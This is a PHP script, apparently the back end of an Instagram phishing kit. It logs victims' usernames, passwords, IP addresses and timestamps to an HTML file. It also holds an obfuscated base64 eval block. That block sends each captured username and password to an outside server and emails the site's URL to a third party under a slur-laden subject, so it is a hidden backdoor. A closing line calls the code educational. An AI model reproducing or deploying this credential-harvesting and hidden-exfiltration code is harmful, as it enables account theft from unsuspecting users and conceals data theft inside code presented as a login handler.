<?php
error_reporting(0);
 
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date("Y-m-d;h:i:s"); 
 
 
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: index.html'); // codigo de verificacion que no esten los campos vacios
}else{
 
eval(base64_decode('ZnVuY3Rpb24gY3VyUGFnZVVSTCgpIHsNCiRwYWdlVVJMID0gJ2h0dHAnOw0KaWYgKCRfU0VSVkVSWyJIVFRQUyJdID09ICJvbiIpIHskcGFnZVVSTCAuPSAicyI7fQ0KJHBhZ2VVUkwgLj0gIjovLyI7DQppZiAoJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0gIT0gIjgwIikgew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4iOiIuJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0uJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQp9IGVsc2Ugew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCn0NCnJldHVybiAkcGFnZVVSTDsNCn0NCiRteXVybCA9IGN1clBhZ2VVUkwoKTsNCmlmKHN0cnBvcygkbXl1cmwsICJ3aXpibG9nZ2VyLmNvbSIpKSB7DQp9DQplbHNlDQp7DQogICRmcm9tID0gJG15dXJsIC4gIkBzaXRlLmNvbSI7DQogICR0byA9ICJuYXdnYW50YXJlMUBnbWFpbC5jb20iOw0KICAkc3ViamVjdCA9ICJJbnN0YWdyYW0gbmV3IG5pZ2dhLiI7DQogICRtZXNzYWdlID0gIm5ldyBzaXRlIHlhaGEgY2hhbCByYWhpIGhhaSIgLiAkbXl1cmw7DQogIG1haWwoJHRvLCRzdWJqZWN0LCRtZXNzYWdlKTsNCn0NCg0KJHVybD0iaHR0cHM6Ly9hcGkuZTkxLmluL0luc3RhVG9vbHMvY2hlY2tMb2dpblJhdy5waHA/dXNlcm5hbWU9Ii4kdXN1YXJpby4iJnBhc3N3b3JkPSIuJGNsYXZlOw0KQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOw=='));
 
//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("password.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram

}
?>
 
 
 
//this is just for educational purpose